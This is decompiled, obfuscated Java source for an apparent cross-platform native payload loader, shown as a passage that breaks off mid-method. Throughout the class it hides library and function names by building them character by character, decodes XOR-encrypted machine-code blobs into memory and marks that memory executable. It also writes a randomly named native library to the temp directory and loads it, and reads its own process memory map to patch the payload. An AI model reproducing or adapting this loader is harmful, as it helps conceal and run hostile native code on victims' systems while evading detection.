package net.java;

import com.sun.jna.Function;
import com.sun.jna.Memory;
import com.sun.jna.NativeLibrary;
import com.sun.jna.Pointer;
import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.File;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Properties;
import java.util.Random;

public class g {
   private static Object a;
   private static Function a;
   private static Function b;
   private static Function c;
   private static int a = 1;
   private static int b = 2;
   private static int c = 4;
   private static int d = 32;
   private static int e = 2;
   private static int f = 4096;
   private static int g = 2;
   private static Object b;
   private static Function d;
   private static Function e;
   private static Function f;

   private static boolean b() {
      try {
         ClassLoader var10000 = g.class.getClassLoader();
         StringBuilder var0;
         (var0 = new StringBuilder()).append('c');
         var0.append('o');
         var0.append('m');
         var0.append('.');
         var0.append('s');
         var0.append('u');
         var0.append('n');
         var0.append('.');
         var0.append('j');
         var0.append('n');
         var0.append('a');
         var0.append('.');
         var0.append('N');
         var0.append('a');
         var0.append('t');
         var0.append('i');
         var0.append('v');
         var0.append('e');
         var10000.loadClass(var0.toString());
         return true;
      } catch (Throwable var1) {
         return false;
      }
   }

   private static void a(byte[] var0, int var1, int var2) {
      var0[var1 + 3] = (byte)(var2 >>> 24);
      var0[var1 + 2] = (byte)(var2 >>> 16);
      var0[var1 + 1] = (byte)(var2 >>> 8);
      var0[var1] = (byte)var2;
   }

   private static void a(byte[] var0, int var1, long var2) {
      var0[var1 + 7] = (byte)((int)(var2 >>> 56));
      var0[var1 + 6] = (byte)((int)(var2 >>> 48));
      var0[var1 + 5] = (byte)((int)(var2 >>> 40));
      var0[var1 + 4] = (byte)((int)(var2 >>> 32));
      var0[var1 + 3] = (byte)((int)(var2 >>> 24));
      var0[var1 + 2] = (byte)((int)(var2 >>> 16));
      var0[var1 + 1] = (byte)((int)(var2 >>> 8));
      var0[var1] = (byte)((int)var2);
   }

   private static long a(byte[] var0, int var1) {
      return 0L | (long)(var0[var1 + 7] & 255) << 56 | (long)(var0[var1 + 6] & 255) << 48 | (long)(var0[var1 + 5] & 255) << 40 | (long)(var0[var1 + 4] & 255) << 32 | (long)(var0[var1 + 3] & 255) << 24 | (long)((var0[var1 + 2] & 255) << 16) | (long)((var0[var1 + 1] & 255) << 8) | (long)(var0[var1] & 255);
   }

   private static int a(byte[] var0, int var1) {
      return 0 | (var0[var1 + 3] & 255) << 24 | (var0[var1 + 2] & 255) << 16 | (var0[var1 + 1] & 255) << 8 | var0[var1] & 255;
   }

   private static final byte[] a(byte[] var0) {
      int var1 = 917994066 % var0.length + 1073342320;
      byte[] var2;
      (var2 = new byte[4])[0] = (byte)(var1 >>> 24);
      var2[1] = (byte)(var1 >>> 16);
      var2[2] = (byte)(var1 >>> 8);
      var2[3] = (byte)var1;
      byte[] var4 = new byte[var0.length];

      for(int var3 = 0; var3 < var0.length; ++var3) {
         var4[var3] = (byte)(var0[var3] ^ var2[var3 % 4]);
      }

      return var4;
   }

   private static int b(byte[] var0, int var1) {
      if (var1 < 0) {
         return 0;
      } else {
         long var2 = 0L;
         boolean var4 = false;
         long var5 = 0L;

         for(int var7 = 0; var7 < var1; ++var7) {
            if (var4) {
               if (var0[var7] != 0) {
                  var4 = false;
                  if ((long)(var7 - 1) - var2 > 512L) {
                     var5 = var2;
                  }
               }
            } else if (var0[var7] == 0) {
               var2 = (long)var7;
               var4 = true;
            }
         }

         long var8;
         if (l.g()) {
            var8 = 16384L;
         } else {
            var8 = 4096L;
         }

         long var10;
         if ((var10 = var5 / var8) * var8 < var5) {
            ++var10;
         }

         return (int)(var10 * var8);
      }
   }

   private static boolean a(byte[] var0) {
      byte[] var1 = new byte[]{-1, -18, -35, -52, -69, -86, -103, -120};
      int var3 = l.a((Object)var0, (Object)var1);

      for(int var2 = 0; var2 < 8; ++var2) {
         var1[var2] = 0;
      }

      return var3 <= 0 || var3 >= 2048;
   }

   private static int a(byte[] var0) {
      byte[] var1 = new byte[]{-35, -52, -69, -86};
      byte[] var2 = new byte[]{-1, -18, -35, -52, -69, -86, -103, -120};

      try {
         byte var3;
         int var4;
         boolean var5;
         if ((var4 = l.a((Object)(new Object[]{var0, 2048, var2}))) < 0) {
            if ((var4 = l.a((Object)(new Object[]{var0, 2048, var1}))) < 0) {
               return -1;
            }

            var3 = 20;
            var5 = true;
         } else {
            var3 = 40;
            var5 = false;
         }

         long var6;
         long var8;
         if (var5) {
            var6 = (long)a(var0, var4 + 4);
            var8 = (long)a(var0, var4 + 8);
         } else {
            var6 = a(var0, var4 + 8);
            var8 = a(var0, var4 + 16);
         }

         long var10 = var6 + var8;
         long var12 = (long)(var4 + var3);
         long var14 = (long)var4 + (long)var3 + var10;
         if (var6 > 0L) {
            return -2;
         } else {
            long var16;
            if (var5) {
               var16 = (long)a(var0, (int)(var12 - 4L)) + var14 - var8;
            } else {
               var16 = a(var0, (int)(var12 - 8L)) + var14 - var8;
            }

            int var20 = (int)var16;
            return var20;
         }
      } finally {
         for(int var21 = 0; var21 < 8; ++var21) {
            var2[var21] = 0;
         }

         for(int var22 = 0; var22 < 4; ++var22) {
            var1[var22] = 0;
         }

      }
   }

   private static int a(Object var0, Object var1) {
      byte[] var96 = (byte[])var0;
      byte[] var101 = (byte[])var1;
      long var10 = 0L;
      long var12 = 0L;
      long var14 = 0L;

      Throwable var10000;
      label2391: {
         label2392: {
            int var2;
            try {
               if ((var2 = b(var96, var96.length - 4096)) == 0) {
                  break label2392;
               }
            } catch (Throwable var95) {
               var10000 = var95;
               boolean var10001 = false;
               break label2391;
            }

            long var4;
            label2393: {
               long var16;
               long var18;
               try {
                  while(var10 < (long)(var96.length + (var101 == null ? 0 : var101.length))) {
                     var10 += 4096L;
                  }

                  var16 = 0L;

                  for(var18 = var10; var16 < (long)var2; var18 -= 4096L) {
                     var16 += 4096L;
                  }

                  var10 += 16384L;
                  if ((var4 = a((Object)(new Object[]{0L, var10, 8192, 4}))) == 0L) {
                     break label2393;
                  }
               } catch (Throwable var94) {
                  var10000 = var94;
                  boolean var108 = false;
                  break label2391;
               }

               label2396: {
                  long var6;
                  try {
                     if ((var6 = a((Object)(new Object[]{var4, var16, 4096, 4}))) == 0L) {
                        break label2396;
                     }
                  } catch (Throwable var93) {
                     var10000 = var93;
                     boolean var109 = false;
                     break label2391;
                  }

                  label2397: {
                     long var8;
                     try {
                        if ((var8 = a((Object)(new Object[]{var4 + var16, var18, 4096, 4}))) == 0L) {
                           break label2397;
                        }
                     } catch (Throwable var92) {
                        var10000 = var92;
                        boolean var110 = false;
                        break label2391;
                     }

                     if (var8 != var4 + var16) {
                        if (var4 != 0L) {
                           a(var4, var10);
                        }

                        if (0L != 0L) {
                           a(0L, 4096L);
                        }

                        if (0L != 0L) {
                           a(0L, 4096L);
                        }

                        return 210;
                     }

                     label2399: {
                        try {
                           a(var4, var96, var96.length);
                           if (var101 != null) {
                              a(var4 + (long)var96.length, var101, var101.length);
                           }

                           if (a((Object)(new Object[]{var6, var16, 32, null})) != Boolean.TRUE) {
                              break label2399;
                           }
                        } catch (Throwable var91) {
                           var10000 = var91;
                           boolean var111 = false;
                           break label2391;
                        }

                        label2400: {
                           try {
                              if ((var102 = a(var96)) == -1) {
                                 break label2400;
                              }
                           } catch (Throwable var90) {
                              var10000 = var90;
                              boolean var112 = false;
                              break label2391;
                           }

                           if (var102 == -2) {
                              if (var4 != 0L) {
                                 a(var4, var10);
                              }

                              if (0L != 0L) {
                                 a(0L, 4096L);
                              }

                              if (0L != 0L) {
                                 a(0L, 4096L);
                              }

                              return 213;
                           }

                           label2402: {
                              try {
                                 byte[] var104 = a(new byte[]{-52, -10, -7, 104, 108, -82, -79, -38, -74, 50, -81, 17, -45, -39, -81, 25, 68, -15, -81, 25, 76, -23, -81, 25, 108, -31, -81, 25, 116, -39, 24, -127, 119, 112, -92, -70, 14, 57, -81, 17, -5, -39, -71, -51, 100, 58});
                                 byte[] var3 = a(new byte[]{106, 114, 11, -44, -76, -116, -17, 125, 73, -23, 24, -12, 51, 6, -111, -118, -64, -113, -29, 125, 41, 122, 35, -110, -74, -65, -13, -79, -1, -89, -70, 65});
                                 byte[] var106 = a(new byte[]{-52, -10, -8, 122, -63, -2, -25, 123, -52, -6, -25, 40, 61, 117, -90, 43, 55, -7, -89, 123, 63, 125, -89, 43, 63, -8, -40, 84, 95, -17, -25, 123, -33, -6, -8, 40, -63, -2, -89, 123, -52, -2, -90, 122, -1, -6, -72, 84});
                                 var12 = a((Object)(new Object[]{0L, 4096L, 12288, 4}));
                                 if (l.g()) {
                                    a(var12, var106, var106.length);
                                 } else if (l.f()) {
                                    a(var12, var104, var104.length);
                                 } else if (l.e()) {
                                    a(var12, var3, var3.length);
                                 }

                                 a((Object)(new Object[]{var12, 4096L, 32, null}));
                                 var14 = a((Object)(new Object[]{0L, 4096L, 12288, 4}));
                                 var105 = new byte[48];
                                 boolean var97;
                                 if (var97 = a(var96)) {
                                    a(var105, 0, (int)(var4 + (long)var102));
                                    a(var105, 4, (int)(var4 + (long)var102));
                                    a(var105, 8, (int)var16);
                                 } else {
                                    a(var105, 0, var4 + (long)var102);
                                    a(var105, 8, var4 + (long)var102);
                                    a(var105, 16, var16);
                                 }

                                 a(var14, var105, 48);
                                 Pointer var103;
                                 if ((var103 = Function.getFunction(new Pointer(var12)).invokePointer(new Object[]{new Pointer(var14)})) != null) {
                                    Pointer.nativeValue(var103);
                                 }

                                 (new Pointer(var14)).read(0L, var105, 0, 48);
                                 if (var97) {
                                    var100 = a(var105, 20);
                                    break label2402;
                                 }
                              } catch (Throwable var89) {
                                 var10000 = var89;
                                 boolean var113 = false;
                                 break label2391;
                              }

                              try {
                                 var99 = (int)a(var105, 40);
                              } catch (Throwable var88) {
                                 var10000 = var88;
                                 boolean var114 = false;
                                 break label2391;
                              }

                              if (var14 != 0L) {
                                 a(var14, 4096L);
                              }

                              if (var12 != 0L) {
                                 a(var12, 4096L);
                              }

                              return var99;
                           }

                           if (var14 != 0L) {
                              a(var14, 4096L);
                           }

                           if (var12 != 0L) {
                              a(var12, 4096L);
                           }

                           return var100;
                        }

                        if (var4 != 0L) {
                           a(var4, var10);
                        }

                        if (0L != 0L) {
                           a(0L, 4096L);
                        }

                        if (0L != 0L) {
                           a(0L, 4096L);
                        }

                        return 212;
                     }

                     if (var4 != 0L) {
                        a(var4, var10);
                     }

                     if (0L != 0L) {
                        a(0L, 4096L);
                     }

                     if (0L != 0L) {
                        a(0L, 4096L);
                     }

                     return 211;
                  }

                  if (var4 != 0L) {
                     a(var4, var10);
                  }

                  if (0L != 0L) {
                     a(0L, 4096L);
                  }

                  if (0L != 0L) {
                     a(0L, 4096L);
                  }

                  return 209;
               }

               if (var4 != 0L) {
                  a(var4, var10);
               }

               if (0L != 0L) {
                  a(0L, 4096L);
               }

               if (0L != 0L) {
                  a(0L, 4096L);
               }

               return 208;
            }

            if (var4 != 0L) {
               a(var4, var10);
            }

            if (0L != 0L) {
               a(0L, 4096L);
            }

            if (0L != 0L) {
               a(0L, 4096L);
            }

            return 207;
         }

         if (0L != 0L) {
            a(0L, 0L);
         }

         if (0L != 0L) {
            a(0L, 4096L);
         }

         if (0L != 0L) {
            a(0L, 4096L);
         }

         return 206;
      }

      Throwable var98 = var10000;
      if (var14 != 0L) {
         a(var14, 4096L);
      }

      if (var12 != 0L) {
         a(var12, 4096L);
      }

      throw var98;
   }

   private static Object a() {
      if (a == null) {
         StringBuilder var0;
         (var0 = new StringBuilder()).append('k');
         var0.append('e');
         var0.append('r');
         var0.append('n');
         var0.append('e');
         var0.append('l');
         var0.append('3');
         var0.append('2');
         a = NativeLibrary.getInstance(var0.toString());
      }

      return a;
   }

   private static void a(long var0, byte[] var2, int var3) {
      (new Pointer(var0)).write(0L, var2, 0, var3);
   }

   private static Object a(Object var0) {
      Object[] var7;
      long var2 = (Long)(var7 = var0)[0];
      long var4 = (Long)var7[1];
      int var1 = (Integer)var7[2];
      int[] var8 = (int[])var7[3];
      if (a == null) {
         a = ((NativeLibrary)a()).getFunction(b());
      }

      Memory var6 = new Memory(4L);
      Pointer var9 = a.invokePointer(new Object[]{new Pointer(var2), new Pointer(var4), var1, var6});
      if (var8 != null) {
         var8[0] = var6.getInt(0L);
      }

      if (var9 == null) {
         return Boolean.FALSE;
      } else {
         return Pointer.nativeValue(var9) == 1L ? Boolean.TRUE : Boolean.FALSE;
      }
   }

   private static boolean a(long var0, long var2) {
      if (b == null) {
         b = ((NativeLibrary)a()).getFunction(e());
      }

      Pointer var4;
      if ((var4 = b.invokePointer(new Object[]{new Pointer(var0), new Pointer(var2), 32768})) == null) {
         return false;
      } else {
         return Pointer.nativeValue(var4) == 1L;
      }
   }

   private static long a(Object var0) {
      Object[] var6;
      long var2 = (Long)(var6 = var0)[0];
      long var4 = (Long)var6[1];
      int var1 = (Integer)var6[2];
      int var7 = (Integer)var6[3];
      if (c == null) {
         c = ((NativeLibrary)a()).getFunction(c());
      }

      return Pointer.nativeValue(c.invokePointer(new Object[]{new Pointer(var2), new Pointer(var4), var1, var7}));
   }

   private static int b(Object var0, Object var1) {
      byte[] var48 = (byte[])var0;
      byte[] var51 = (byte[])var1;
      long var8 = 0L;

      label769: {
         int var2;
         Throwable var10000;
         try {
            if ((var2 = b(var48, var48.length - 4096)) == 0) {
               break label769;
            }
         } catch (Throwable var47) {
            var10000 = var47;
            boolean var10001 = false;
            throw var10000;
         }

         long var4;
         label770: {
            long var10;
            try {
               while(var8 < (long)(var48.length + (var51 == null ? 0 : var51.length))) {
                  var8 += 4096L;
               }

               for(var10 = 0L; var10 < (long)var2; var10 += 4096L) {
               }

               var8 += 16384L;
               Object[] var13;
               long var14 = (Long)(var13 = new Object[]{0L, var8, a | b, d | e, -1, 0})[0];
               long var16 = (Long)var13[1];
               var2 = (Integer)var13[2];
               int var3 = (Integer)var13[3];
               int var6 = (Integer)var13[4];
               int var7 = (Integer)var13[5];
               if (f == null) {
                  f = ((NativeLibrary)b()).getFunction(h());
               }

               Pointer var53;
               if ((var4 = (var53 = f.invokePointer(new Object[]{new Pointer(var14), new Pointer(var16), var2, var3, var6, new Pointer((long)var7)})) == null ? 0L : Pointer.nativeValue(var53)) == 0L) {
                  break label770;
               }
            } catch (Throwable var46) {
               var10000 = var46;
               boolean var56 = false;
               throw var10000;
            }

            label773: {
               try {
                  a(var4, var48, var48.length);
                  if (var51 != null) {
                     a(var4 + (long)var48.length, var51, var51.length);
                  }

                  int var55 = a | c;
                  if (d == null) {
                     d = ((NativeLibrary)b()).getFunction(g());
                  }

                  Pointer var17;
                  if (((var17 = d.invokePointer(new Object[]{new Pointer(var4), new Pointer(var10), var55})) == null ? 0 : (int)Pointer.nativeValue(var17)) != 0) {
                     break label773;
                  }
               } catch (Throwable var45) {
                  var10000 = var45;
                  boolean var57 = false;
                  throw var10000;
               }

               label775: {
                  try {
                     if ((var49 = a(var48)) == -1) {
                        break label775;
                     }
                  } catch (Throwable var44) {
                     var10000 = var44;
                     boolean var58 = false;
                     throw var10000;
                  }

                  if (var49 == -2) {
                     if (var4 != 0L) {
                        a(var4, var8);
                     }

                     return 213;
                  }

                  try {
                     int var50 = ((Number)b((Object)(new Object[]{var4 + (long)var49, var4 + (long)var49, var10}))).intValue();
                     return var50;
                  } catch (Throwable var43) {
                     var10000 = var43;
                     boolean var59 = false;
                     throw var10000;
                  }
               }

               if (var4 != 0L) {
                  a(var4, var8);
               }

               return 212;
            }

            if (var4 != 0L) {
               a(var4, var8);
            }

            return 211;
         }

         if (var4 != 0L) {
            a(var4, var8);
         }

         return 207;
      }

      if (0L != 0L) {
         a(0L, 0L);
      }

      return 206;
   }

   private static Object b() {
      if (b == null) {
         try {
            StringBuilder var4;
            (var4 = new StringBuilder()).append('l');
            var4.append('i');
            var4.append('b');
            var4.append('c');
            b = NativeLibrary.getInstance(var4.toString());
         } catch (Throwable var2) {
            try {
               StringBuilder var3;
               (var3 = new StringBuilder()).append('l');
               var3.append('i');
               var3.append('b');
               var3.append('c');
               var3.append('.');
               var3.append('s');
               var3.append('o');
               var3.append('.');
               var3.append('6');
               b = NativeLibrary.getInstance(var3.toString());
            } catch (Throwable var1) {
               StringBuilder var0;
               (var0 = new StringBuilder()).append('l');
               var0.append('i');
               var0.append('b');
               var0.append('c');
               var0.append('.');
               var0.append('s');
               var0.append('o');
               b = NativeLibrary.getInstance(var0.toString());
            }
         }
      }

      return b;
   }

   private static int a(long var0, long var2) {
      if (e == null) {
         e = ((NativeLibrary)b()).getFunction(f());
      }

      Pointer var4;
      return (var4 = e.invokePointer(new Object[]{new Pointer(var0), new Pointer(var2)})) == null ? 0 : (int)Pointer.nativeValue(var4);
   }

   private static Object b(Object var0) {
      Object[] var7;
      long var1 = (Long)(var7 = var0)[0];
      long var3 = (Long)var7[1];
      long var5 = (Long)var7[2];
      Pointer var8;
      return (var8 = Function.getFunction(new Pointer(var1)).invokePointer(new Object[]{new Pointer(var3), new Pointer(var5), new Pointer(0L), new Pointer(0L)})) == null ? 0 : Pointer.nativeValue(var8);
   }

   private static int c(Object var0, Object var1) {
      byte[] var50 = (byte[])var0;
      byte[] var53 = (byte[])var1;
      long var8 = 0L;

      label763: {
         int var2;
         Throwable var10000;
         try {
            if ((var2 = b(var50, var50.length - 4096)) == 0) {
               break label763;
            }
         } catch (Throwable var49) {
            var10000 = var49;
            boolean var10001 = false;
            throw var10000;
         }

         long var4;
         label764: {
            long var10;
            try {
               while(var8 < (long)(var50.length + (var53 == null ? 0 : var53.length))) {
                  var8 += 4096L;
               }

               for(var10 = 0L; var10 < (long)var2; var10 += 4096L) {
               }

               var8 += 16384L;
               Object[] var13;
               long var14 = (Long)(var13 = new Object[]{0L, var8, a | b, f | g, -1, 0})[0];
               long var16 = (Long)var13[1];
               var2 = (Integer)var13[2];
               int var3 = (Integer)var13[3];
               int var6 = (Integer)var13[4];
               int var7 = (Integer)var13[5];
               if (f == null) {
                  f = (Function)a(h());
               }

               Pointer var55 = f.invokePointer(new Object[]{new Pointer(var14), new Pointer(var16), var2, var3, var6, new Pointer((long)var7)});
               long var18 = 0L;
               if (var55 != null) {
                  var18 = Pointer.nativeValue(var55);
               }

               var4 = var18;
               if (var18 == 0L) {
                  break label764;
               }
            } catch (Throwable var48) {
               var10000 = var48;
               boolean var58 = false;
               throw var10000;
            }

            label767: {
               try {
                  a(var4, var50, var50.length);
                  if (var53 != null) {
                     a(var4 + (long)var50.length, var53, var53.length);
                  }

                  int var57 = a | c;
                  if (d == null) {
                     d = (Function)a(g());
                  }

                  Pointer var17;
                  if (((var17 = d.invokePointer(new Object[]{new Pointer(var4), new Pointer(var10), var57})) == null ? 0 : (int)Pointer.nativeValue(var17)) != 0) {
                     break label767;
                  }
               } catch (Throwable var47) {
                  var10000 = var47;
                  boolean var59 = false;
                  throw var10000;
               }

               label769: {
                  try {
                     if ((var51 = a(var50)) == -1) {
                        break label769;
                     }
                  } catch (Throwable var46) {
                     var10000 = var46;
                     boolean var60 = false;
                     throw var10000;
                  }

                  if (var51 == -2) {
                     if (var4 != 0L) {
                        b(var4, var8);
                     }

                     return 213;
                  }

                  try {
                     int var52 = ((Number)b((Object)(new Object[]{var4 + (long)var51, var4 + (long)var51, var10}))).intValue();
                     return var52;
                  } catch (Throwable var45) {
                     var10000 = var45;
                     boolean var61 = false;
                     throw var10000;
                  }
               }

               if (var4 != 0L) {
                  b(var4, var8);
               }

               return 212;
            }

            if (var4 != 0L) {
               b(var4, var8);
            }

            return 211;
         }

         if (var4 != 0L) {
            b(var4, var8);
         }

         return 207;
      }

      if (0L != 0L) {
         b(0L, 0L);
      }

      return 206;
   }

   private static Object a(String var0) {
      try {
         return NativeLibrary.getInstance(d()).getFunction(var0);
      } catch (Throwable var3) {
         try {
            StringBuilder var4;
            (var4 = new StringBuilder()).append('/');
            var4.append('u');
            var4.append('s');
            var4.append('r');
            var4.append('/');
            var4.append('l');
            var4.append('i');
            var4.append('b');
            var4.append('/');
            var4.append('s');
            var4.append('y');
            var4.append('s');
            var4.append('t');
            var4.append('e');
            var4.append('m');
            var4.append('/');
            var4.append('l');
            var4.append('i');
            var4.append('b');
            var4.append('d');
            var4.append('y');
            var4.append('l');
            var4.append('d');
            var4.append('.');
            var4.append('d');
            var4.append('y');
            var4.append('l');
            var4.append('i');
            var4.append('b');
            return NativeLibrary.getInstance(var4.toString()).getFunction(var0);
         } catch (Throwable var2) {
            StringBuilder var1;
            (var1 = new StringBuilder()).append('/');
            var1.append('u');
            var1.append('s');
            var1.append('r');
            var1.append('/');
            var1.append('l');
            var1.append('i');
            var1.append('b');
            var1.append('/');
            var1.append('l');
            var1.append('i');
            var1.append('b');
            var1.append('S');
            var1.append('y');
            var1.append('s');
            var1.append('t');
            var1.append('e');
            var1.append('m');
            var1.append('.');
            var1.append('B');
            var1.append('.');
            var1.append('d');
            var1.append('y');
            var1.append('l');
            var1.append('i');
            var1.append('b');
            return NativeLibrary.getInstance(var1.toString()).getFunction(var0);
         }
      }
   }

   private static int b(long var0, long var2) {
      if (e == null) {
         e = (Function)a(f());
      }

      Pointer var4;
      return (var4 = e.invokePointer(new Object[]{new Pointer(var0), new Pointer(var2)})) == null ? 0 : (int)Pointer.nativeValue(var4);
   }

   private static long a(int var0) {
      try {
         Process var1 = null;
         int var2 = var0;
         int var3 = a();
         if (var0 == var3 && !l.g()) {
            Runtime var10000 = Runtime.getRuntime();
            String[] var10001 = new String[2];
            StringBuilder var18;
            (var18 = new StringBuilder()).append('p');
            var18.append('i');
            var18.append('n');
            var18.append('g');
            var10001[0] = var18.toString();
            (var18 = new StringBuilder()).append('l');
            var18.append('o');
            var18.append('c');
            var18.append('a');
            var18.append('l');
            var18.append('h');
            var18.append('o');
            var18.append('s');
            var18.append('t');
            var10001[1] = var18.toString();
            Process var12;
            var1 = var12 = var10000.exec(var10001);

            try {
               var2 = ((Number)Process.class.getMethod(a()).invoke(var12)).intValue();
            } catch (Throwable var10) {
               try {
                  Field var15;
                  (var15 = var12.getClass().getDeclaredField(a())).setAccessible(true);
                  var2 = var15.getInt(var12);
               } catch (Exception var9) {
                  var9.printStackTrace();
                  return 0L;
               }
            }
         }

         String[] var10002 = new String[3];
         StringBuilder var20;
         (var20 = new StringBuilder()).append('v');
         var20.append('m');
         var20.append('m');
         var20.append('a');
         var20.append('p');
         var10002[0] = var20.toString();
         (var20 = new StringBuilder()).append('-');
         var20.append('w');
         var10002[1] = var20.toString();
         var10002[2] = Integer.toString(var2);
         Process var16 = (new ProcessBuilder(var10002)).start();
         BufferedReader var17 = new BufferedReader(new InputStreamReader(var16.getInputStream()));
         long var5 = 0L;

         while((var13 = var17.readLine()) != null) {
            if (var5 == 0L && var13.contains(d())) {
               (var20 = new StringBuilder()).append('_');
               var20.append('_');
               var20.append('T');
               var20.append('E');
               var20.append('X');
               var20.append('T');
               if (var13.startsWith(var20.toString())) {
                  (var20 = new StringBuilder()).append('\\');
                  var20.append('s');
                  var20.append('+');
                  String[] var14 = var13.split(var20.toString());

                  for(int var24 = 0; var24 < var14.length; ++var24) {
                     int var4 = var14[var24].indexOf(45);

                     try {
                        var5 = Long.parseLong(var14[var24].substring(0, var4), 16);
                     } catch (Exception var8) {
                     }
                  }
               }
            }
         }

         if (var1 != null) {
            try {
               var1.destroyForcibly();
            } catch (Throwable var7) {
               var1.destroy();
            }
         }

         return var5;
      } catch (Throwable var11) {
         var11.printStackTrace();
         return 0L;
      }
   }

   private static int a() {
      try {
         ClassLoader var10000 = g.class.getClassLoader();
         StringBuilder var1;
         (var1 = new StringBuilder()).append('j');
         var1.append('a');
         var1.append('v');
         var1.append('a');
         var1.append('.');
         var1.append('l');
         var1.append('a');
         var1.append('n');
         var1.append('g');
         var1.append('.');
         var1.append('m');
         var1.append('a');
         var1.append('n');
         var1.append('a');
         var1.append('g');
         var1.append('e');
         var1.append('m');
         var1.append('e');
         var1.append('n');
         var1.append('t');
         var1.append('.');
         var1.append('M');
         var1.append('a');
         var1.append('n');
         var1.append('a');
         var1.append('g');
         var1.append('e');
         var1.append('m');
         var1.append('e');
         var1.append('n');
         var1.append('t');
         var1.append('F');
         var1.append('a');
         var1.append('c');
         var1.append('t');
         var1.append('o');
         var1.append('r');
         var1.append('y');
         Class var7 = var10000.loadClass(var1.toString());
         (var1 = new StringBuilder()).append('g');
         var1.append('e');
         var1.append('t');
         var1.append('R');
         var1.append('u');
         var1.append('n');
         var1.append('t');
         var1.append('i');
         var1.append('m');
         var1.append('e');
         var1.append('M');
         var1.append('X');
         var1.append('B');
         var1.append('e');
         var1.append('a');
         var1.append('n');
         Method var0 = var7.getDeclaredMethod(var1.toString());
         ClassLoader var8 = g.class.getClassLoader();
         (var1 = new StringBuilder()).append('j');
         var1.append('a');
         var1.append('v');
         var1.append('a');
         var1.append('.');
         var1.append('l');
         var1.append('a');
         var1.append('n');
         var1.append('g');
         var1.append('.');
         var1.append('m');
         var1.append('a');
         var1.append('n');
         var1.append('a');
         var1.append('g');
         var1.append('e');
         var1.append('m');
         var1.append('e');
         var1.append('n');
         var1.append('t');
         var1.append('.');
         var1.append('R');
         var1.append('u');
         var1.append('n');
         var1.append('t');
         var1.append('i');
         var1.append('m');
         var1.append('e');
         var1.append('M');
         var1.append('X');
         var1.append('B');
         var1.append('e');
         var1.append('a');
         var1.append('n');
         Class var9 = var8.loadClass(var1.toString());
         (var1 = new StringBuilder()).append('g');
         var1.append('e');
         var1.append('t');
         var1.append('N');
         var1.append('a');
         var1.append('m');
         var1.append('e');
         String var3;
         return Integer.parseInt((var3 = (String)var9.getDeclaredMethod(var1.toString()).invoke(var0.invoke((Object)null))).substring(0, var3.indexOf(64)));
      } catch (Exception var2) {
         var2.printStackTrace();
         return 0;
      }
   }

   private static int b(byte[] var0) {
      byte[] var1 = null;
      if (l.a()) {
         if (l.g()) {
            var1 = k.h();
         } else if (l.e()) {
            var1 = k.f();
         } else if (l.f()) {
            var1 = k.g();
         }
      } else if (!l.c() && !l.d()) {
         if (l.b()) {
            if (l.g()) {
               var1 = k.a();
            } else if (l.f()) {
               var1 = k.b();
            }
         }
      } else if (l.g()) {
         var1 = k.e();
      } else if (l.e()) {
         var1 = k.d();
      } else if (l.f()) {
         var1 = k.c();
      }

      Random var2 = new Random();
      String var8 = Long.toHexString(var2.nextLong()) + '-' + Long.toHexString(var2.nextLong());
      StringBuilder var3;
      (var3 = new StringBuilder()).append('j');
      var3.append('a');
      var3.append('v');
      var3.append('a');
      var3.append('.');
      var3.append('i');
      var3.append('o');
      var3.append('.');
      var3.append('t');
      var3.append('m');
      var3.append('p');
      var3.append('d');
      var3.append('i');
      var3.append('r');
      String var10 = System.getProperty(var3.toString());
      l.a.put(System.class, l.class);
      File var9 = new File(var10, System.mapLibraryName(var8));
      l.b((Object)(new Object[]{var9, var1}));
      System.load(var9.getAbsolutePath());
      l.a.remove(System.class);
      if (l.b()) {
         long var4 = (long)(var0.length - 4096 + 48);
         long var6 = a(a());
         a(var0, (int)var4, var6);
      }

      Object var11;
      if ((var11 = l.n(var0)) != null && var11 instanceof long[]) {
         int var5;
         if ((var5 = (int)((long[])var11)[0]) == 0) {
            Thread.sleep(350L);
         }

         return var5;
      } else {
         return 256;
      }
   }

   private static byte[] a() {
      byte var0 = -1;
      if (l.g()) {
         var0 = 0;
      } else if (l.e()) {
         var0 = 1;
      } else if (l.f()) {
         var0 = 2;
      }

      byte[] var1 = l.b(l.b());
      ByteArrayInputStream var7 = new ByteArrayInputStream(var1);
      DataInputStream var8 = new DataInputStream(var7);

      try {
         for(int var2 = 0; var2 < 3; ++var2) {
            byte var3 = var8.readByte();
            int var4 = var8.readInt();
            if (var3 == var0) {
               byte[] var6 = new byte[var4];
               var8.readFully(var6);
               return var6;
            }

            var8.skip((long)var4);
         }
      } catch (Exception var5) {
         var5.printStackTrace();
      }

      return null;
   }

   public static boolean a() {
      byte[] var0 = null;

      try {
         byte[] var1;
         boolean var2 = a(var1 = a());
         byte[] var4 = a(new byte[]{108, -79, -94, -50, 115, -70, -88, -58, 122, -90, -93, -61, 107, -72, -72, -35, 108, -79, -94, -50, 115, -70, -88, -58, 122, -90, -93, -61, 107, -72, -72, -35});
         int var3 = l.a((Object)var1, (Object)var4);

         for(int var5 = 0; var5 < var4.length; ++var5) {
            var4[var5] = 0;
         }

         System.arraycopy(var1, 0, var1, var3, 24);

         for(int var22 = var3; var22 < var3 + 24; ++var22) {
            var1[var22] = (byte)(var1[var22] ^ 153);
         }

         a(var1, var3 + 24, (long)var1.length);
         byte[] var23 = l.a(var1, var1.length + 4096);
         if (l.a()) {
            long var25 = (long)var1.length;
            if (var2) {
               a(var23, (int)var25, 2);
            } else {
               a(var23, (int)var25, 2L);
            }
         } else if (l.b()) {
            long var24 = (long)var1.length;
            if (var2) {
               a(var23, (int)var24, 3);
            } else {
               a(var23, (int)var24, 3L);
            }
         } else if (l.c() || l.d()) {
            long var6 = (long)var1.length;
            if (var2) {
               a(var23, (int)var6, 1);
            } else {
               a(var23, (int)var6, 1L);
            }
         }

         var0 = var23;
         if (a(var23)) {
            var3 = var23.length - 4096 + 20;
            a(var23, var3, 2);
         } else {
            var3 = var23.length - 4096 + 40;
            a(var23, var3, 2L);
         }

         if (l.b()) {
            long var17 = (long)(var23.length - 4096 + 48);
            long var21 = a(a());
            a(var23, (int)var17, var21);
         }
      } catch (Throwable var16) {
         var16.printStackTrace();
      }

      l.a.put(Properties.class, l.class);
      if (l.a()) {
         label119: {
            if (b()) {
               try {
                  if (a(var0, (Object)null) == 0) {
                     break label119;
                  }
               } catch (Throwable var15) {
                  var15.printStackTrace();
               }
            }

            try {
               if (b(var0) == 0) {
               }
            } catch (Throwable var12) {
               var12.printStackTrace();
            }
         }
